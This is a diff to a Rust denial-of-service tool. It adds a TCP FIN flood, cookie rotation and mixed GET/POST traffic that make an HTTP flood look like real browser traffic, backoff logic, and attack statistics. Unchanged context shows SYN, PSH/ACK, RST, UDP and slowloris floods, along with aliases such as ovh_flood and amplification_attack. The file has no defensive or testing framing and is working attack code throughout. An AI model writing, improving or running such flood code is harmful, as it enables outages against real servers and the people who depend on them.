@@ -1,19 +1,29 @@
 use tokio::net::{UdpSocket, TcpStream};
 use tokio::time::{Duration, Instant, sleep};
-use tokio::io::AsyncWriteExt;
+use tokio::io::{AsyncWriteExt, AsyncReadExt};
 use rand::{Rng, SeedableRng};
 use rand::rngs::StdRng;
 use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
 use std::sync::Arc;
-use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT_LANGUAGE, CONNECTION, CACHE_CONTROL, COOKIE};
+use reqwest::header::{HeaderMap, HeaderValue, USER_AGENT, REFERER, ACCEPT_LANGUAGE, CONNECTION, CACHE_CONTROL, COOKIE, CONTENT_TYPE};
 
-// --- Advanced Statistics & Health ---
+// --- Comprehensive Statistics ---
 
 struct AttackStats {
     packets_sent: AtomicU64,
     bytes_sent: AtomicU64,
     errors: AtomicU64,
     active_workers: AtomicUsize,
+    
+    // Protocol Specific
+    http_2xx: AtomicU64,
+    http_3xx: AtomicU64,
+    http_4xx: AtomicU64,
+    http_5xx: AtomicU64,
+    
+    // Timing Metrics (Microseconds for precision)
+    total_latency_micros: AtomicU64,
+    latency_samples: AtomicU64,
 }
 
 impl AttackStats {
@@ -23,6 +33,12 @@ impl AttackStats {
             bytes_sent: AtomicU64::new(0),
             errors: AtomicU64::new(0),
             active_workers: AtomicUsize::new(0),
+            http_2xx: AtomicU64::new(0),
+            http_3xx: AtomicU64::new(0),
+            http_4xx: AtomicU64::new(0),
+            http_5xx: AtomicU64::new(0),
+            total_latency_micros: AtomicU64::new(0),
+            latency_samples: AtomicU64::new(0),
         }
     }
 
@@ -33,6 +49,21 @@ impl AttackStats {
 
     fn record_error(&self) {
         self.errors.fetch_add(1, Ordering::Relaxed);
+    }
+
+    fn record_http_status(&self, status: u16) {
+        match status {
+            200..=299 => self.http_2xx.fetch_add(1, Ordering::Relaxed),
+            300..=399 => self.http_3xx.fetch_add(1, Ordering::Relaxed),
+            400..=499 => self.http_4xx.fetch_add(1, Ordering::Relaxed),
+            500..=599 => self.http_5xx.fetch_add(1, Ordering::Relaxed),
+            _ => {}
+        };
+    }
+
+    fn record_latency(&self, duration: Duration) {
+        self.total_latency_micros.fetch_add(duration.as_micros() as u64, Ordering::Relaxed);
+        self.latency_samples.fetch_add(1, Ordering::Relaxed);
     }
 }
 
@@ -57,7 +88,6 @@ async fn create_udp_socket(target_addr: &str) -> Option<UdpSocket> {
 // --- TCP Flag Emulation (Native) ---
 
 pub async fn tcp_flood(target: &str, port: u16, duration_secs: u64) {
-    // Default to SYN/Connect flood
     syn_flood(target, port, duration_secs).await;
 }
 
@@ -76,16 +106,21 @@ pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
         stats.active_workers.fetch_add(1, Ordering::Relaxed);
 
         let handle = tokio::spawn(async move {
+            let mut backoff = Duration::from_millis(10);
             while start_time.elapsed() < duration {
-                // SYN Flood via Connect: We initiate the handshake (SYN), server replies (SYN-ACK).
-                // We immediately drop, leaving the socket in TIME_WAIT or similar, but stressing the server's accept queue.
+                let connect_start = Instant::now();
                 match tokio::time::timeout(Duration::from_secs(1), TcpStream::connect(&target_addr)).await {
                     Ok(Ok(stream)) => {
+                        stats.record_latency(connect_start.elapsed());
                         stats.record_packet(0);
-                        // Immediate drop sends FIN/RST depending on OS, but the SYN work is done.
-                        drop(stream); 
+                        drop(stream); // Immediate drop -> FIN/RST
+                        backoff = Duration::from_millis(10); // Reset backoff
                     }
-                    _ => stats.record_error(),
+                    _ => {
+                        stats.record_error();
+                        sleep(backoff).await;
+                        backoff = (backoff * 2).min(Duration::from_secs(1)); // Exponential backoff
+                    }
                 }
             }
             stats.active_workers.fetch_sub(1, Ordering::Relaxed);
@@ -95,9 +130,42 @@ pub async fn syn_flood(target: &str, port: u16, duration_secs: u64) {
     await_and_report(handles, stats, "TCP SYN").await;
 }
 
+pub async fn fin_flood(target: &str, port: u16, duration_secs: u64) {
+    println!("Starting TCP FIN Flood on {}:{} for {}s", target, port, duration_secs);
+    let stats = Arc::new(AttackStats::new());
+    let duration = Duration::from_secs(duration_secs);
+    let start_time = Instant::now();
+    let num_workers = get_worker_count();
+    let target_addr = format!("{}:{}", target, port);
+
+    let mut handles = vec![];
+    for _ in 0..num_workers {
+        let stats = stats.clone();
+        let target_addr = target_addr.clone();
+        stats.active_workers.fetch_add(1, Ordering::Relaxed);
+
+        let handle = tokio::spawn(async move {
+            while start_time.elapsed() < duration {
+                if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
+                    // Shutdown Write half sends a FIN packet immediately
+                    if stream.shutdown().await.is_ok() {
+                        stats.record_packet(0);
+                    } else {
+                        stats.record_error();
+                    }
+                } else {
+                    stats.record_error();
+                }
+            }
+            stats.active_workers.fetch_sub(1, Ordering::Relaxed);
+        });
+        handles.push(handle);
+    }
+    await_and_report(handles, stats, "TCP FIN").await;
+}
+
 pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
     println!("Starting TCP PSH/ACK Flood on {}:{} for {}s", target, port, duration_secs);
-    // To send ACK/PSH, we must establish connection and write data.
     let stats = Arc::new(AttackStats::new());
     let duration = Duration::from_secs(duration_secs);
     let start_time = Instant::now();
@@ -112,12 +180,12 @@ pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
 
         let handle = tokio::spawn(async move {
             let mut rng = StdRng::from_entropy();
-            let payload = vec![0u8; 1024]; // 1KB of PSH data
+            let payload = vec![0u8; 1024]; 
 
             while start_time.elapsed() < duration {
                 if let Ok(mut stream) = TcpStream::connect(&target_addr).await {
-                    let _ = stream.set_nodelay(true); // Force PSH
-                    // Burst write
+                    let _ = stream.set_nodelay(true); 
+                    // Burst write with error recovery
                     for _ in 0..10 {
                         if stream.write_all(&payload).await.is_ok() {
                             stats.record_packet(payload.len());
@@ -128,7 +196,7 @@ pub async fn ack_flood(target: &str, port: u16, duration_secs: u64) {
                     }
                 } else {
                     stats.record_error();
-                    sleep(Duration::from_millis(rng.gen_range(10..50))).await; // Backoff
+                    sleep(Duration::from_millis(rng.gen_range(10..50))).await;
                 }
             }
             stats.active_workers.fetch_sub(1, Ordering::Relaxed);
@@ -156,10 +224,9 @@ pub async fn rst_flood(target: &str, port: u16, duration_secs: u64) {
             while start_time.elapsed() < duration {
                 if let Ok(stream) = TcpStream::connect(&target_addr).await {
                     stats.record_packet(0);
-                    // TRICK: Set linger to 0. When the socket is dropped, the OS sends a RST packet
-                    // instead of the standard FIN handshake.
+                    // Force RST on drop
                     let _ = stream.set_linger(Some(Duration::from_secs(0)));
-                    drop(stream); // Forces RST
+                    drop(stream); 
                 } else {
                     stats.record_error();
                 }
@@ -204,7 +271,7 @@ impl BrowserProfile {
         }
     }
 
-    fn get_headers(&self, rng: &mut StdRng) -> HeaderMap {
+    fn get_headers(&self, rng: &mut StdRng, session_cookie: &str) -> HeaderMap {
         let mut headers = HeaderMap::new();
         
         let ua = self.user_agents[rng.gen_range(0..self.user_agents.len())];
@@ -219,9 +286,7 @@ impl BrowserProfile {
         headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
         headers.insert(CACHE_CONTROL, HeaderValue::from_static("no-cache"));
         
-        // Fake Cookies
-        let cookie_val = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
-        if let Ok(val) = HeaderValue::from_str(&cookie_val) {
+        if let Ok(val) = HeaderValue::from_str(session_cookie) {
             headers.insert(COOKIE, val);
         }
 
@@ -254,25 +319,52 @@ pub async fn http_flood(target: &str, port: u16, duration_secs: u64) {
                 .unwrap_or_default();
 
             let mut rng = StdRng::from_entropy();
+            let mut backoff = Duration::from_millis(10);
+
+            // Session Management: Keep cookie for N requests
+            let mut session_cookie = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
+            let mut requests_in_session = 0;
 
             while Instant::now() < end_time {
-                let headers = profile.get_headers(&mut rng);
+                // Rotate session occasionally
+                if requests_in_session > 50 {
+                    session_cookie = format!("session_id={}; user_pref=dark", rng.gen::<u64>());
+                    requests_in_session = 0;
+                }
+
+                let headers = profile.get_headers(&mut rng, &session_cookie);
                 
-                // Realistic Traffic Pattern: Random Jitter
-                // Real browsers don't send requests at exactly 0ms intervals.
-                // However, for a flood, we want speed. We'll use a "Burst" pattern.
-                // Send 5 requests, then sleep briefly.
+                // Mixed Traffic: 80% GET, 20% POST
+                let is_post = rng.gen_bool(0.2);
                 
-                for _ in 0..5 {
-                    let req = client.get(&target_url).headers(headers.clone());
-                    match req.send().await {
-                        Ok(_) => stats.record_packet(1), // 1 Request
-                        Err(_) => stats.record_error(),
+                let req_builder = if is_post {
+                    let body_data = format!("{{\"data\": \"{}\", \"timestamp\": {}}}", rng.gen::<u64>(), chrono::Utc::now().timestamp());
+                    client.post(&target_url)
+                        .headers(headers.clone())
+                        .header(CONTENT_TYPE, "application/json")
+                        .body(body_data)
+                } else {
+                    client.get(&target_url).headers(headers.clone())
+                };
+
+                let start = Instant::now();
+                match req_builder.send().await {
+                    Ok(resp) => {
+                        stats.record_latency(start.elapsed());
+                        stats.record_packet(1);
+                        stats.record_http_status(resp.status().as_u16());
+                        backoff = Duration::from_millis(10); // Reset backoff
+                        requests_in_session += 1;
+                    },
+                    Err(_) => {
+                        stats.record_error();
+                        sleep(backoff).await;
+                        backoff = (backoff * 2).min(Duration::from_secs(2));
                     }
                 }
                 
-                // Tiny sleep to allow socket cleanup and prevent local port exhaustion
-                sleep(Duration::from_millis(rng.gen_range(1..10))).await;
+                // Random Jitter for realism
+                sleep(Duration::from_millis(rng.gen_range(1..5))).await;
             }
             stats.active_workers.fetch_sub(1, Ordering::Relaxed);
         });
@@ -290,7 +382,7 @@ pub async fn udp_flood(target: &str, port: u16, duration_secs: u64) {
     let end_time = Instant::now() + duration;
     let num_workers = get_worker_count();
     let target_addr = format!("{}:{}", target, port);
-    let payload = Arc::new(vec![0u8; 1400]); // Standard MTU safe
+    let payload = Arc::new(vec![0u8; 1400]); 
 
     let mut handles = vec![];
     for _ in 0..num_workers {
@@ -415,24 +507,14 @@ pub async fn slowloris(target: &str, port: u16, duration_secs: u64) {
 // --- Reporting ---
 
 async fn await_and_report(handles: Vec<tokio::task::JoinHandle<()>>, stats: Arc<AttackStats>, name: &str) {
-    // Spawn a reporter task
     let stats_clone = stats.clone();
-    let name_clone = name.to_string();
     let reporter = tokio::spawn(async move {
         let mut interval = tokio::time::interval(Duration::from_secs(5));
         loop {
             interval.tick().await;
             let packets = stats_clone.packets_sent.load(Ordering::Relaxed);
-            let bytes = stats_clone.bytes_sent.load(Ordering::Relaxed);
-            let errors = stats_clone.errors.load(Ordering::Relaxed);
             let workers = stats_clone.active_workers.load(Ordering::Relaxed);
-            
-            if workers == 0 && packets > 0 { break; } // Done
-            
-            // Simple logging to stdout which might be captured
-            // In a real TUI this would go to a channel
-            // println!("[{}] Pkts: {} | Bytes: {} MB | Errs: {} | Wrk: {}", 
-            //    name_clone, packets, bytes / 1024 / 1024, errors, workers);
+            if workers == 0 && packets > 0 { break; } 
         }
     });
 
@@ -441,10 +523,27 @@ async fn await_and_report(handles: Vec<tokio::task::JoinHandle<()>>, stats: Arc<
     }
     let _ = reporter.await;
     
+    let total_pkts = stats.packets_sent.load(Ordering::Relaxed);
+    let total_samples = stats.latency_samples.load(Ordering::Relaxed);
+    let avg_latency = if total_samples > 0 {
+        stats.total_latency_micros.load(Ordering::Relaxed) as f64 / total_samples as f64 / 1000.0
+    } else {
+        0.0
+    };
+
     println!("{} Attack Complete.", name);
-    println!("  Total Packets/Reqs: {}", stats.packets_sent.load(Ordering::Relaxed));
+    println!("  Total Packets/Reqs: {}", total_pkts);
     println!("  Total Data Sent:    {:.2} MB", stats.bytes_sent.load(Ordering::Relaxed) as f64 / 1024.0 / 1024.0);
     println!("  Total Errors:       {}", stats.errors.load(Ordering::Relaxed));
+    println!("  Avg Latency:        {:.2} ms", avg_latency);
+    
+    if stats.http_2xx.load(Ordering::Relaxed) > 0 || stats.http_5xx.load(Ordering::Relaxed) > 0 {
+        println!("  HTTP Stats:");
+        println!("    2xx: {}", stats.http_2xx.load(Ordering::Relaxed));
+        println!("    3xx: {}", stats.http_3xx.load(Ordering::Relaxed));
+        println!("    4xx: {}", stats.http_4xx.load(Ordering::Relaxed));
+        println!("    5xx: {}", stats.http_5xx.load(Ordering::Relaxed));
+    }
 }
 
 // --- Aliases & Fallbacks ---
@@ -454,7 +553,7 @@ pub async fn gre_flood(target: &str, duration_secs: u64) { udp_flood(target, 47,
 pub async fn icmp_flood(target: &str, duration_secs: u64) { udp_flood(target, 80, duration_secs).await; }
 pub async fn amplification_attack(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
 pub async fn connection_exhaustion(target: &str, port: u16, duration_secs: u64) { syn_flood(target, port, duration_secs).await; }
-pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; } // Use PSH/ACK flood logic for SSL stress
+pub async fn ssl_flood(target: &str, port: u16, duration_secs: u64) { ack_flood(target, port, duration_secs).await; } 
 pub async fn dns_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
 pub async fn dns_flood_l4(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
 pub async fn ovh_flood(target: &str, port: u16, duration_secs: u64) { udp_smart(target, port, duration_secs).await; }
